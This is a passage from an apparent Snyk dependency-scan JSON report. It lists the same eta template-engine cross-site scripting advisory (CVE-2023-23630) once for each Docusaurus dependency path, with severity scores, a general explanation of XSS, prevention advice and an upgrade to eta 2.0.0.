application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-content-blog@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-content-pages@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-debug@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-debug@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
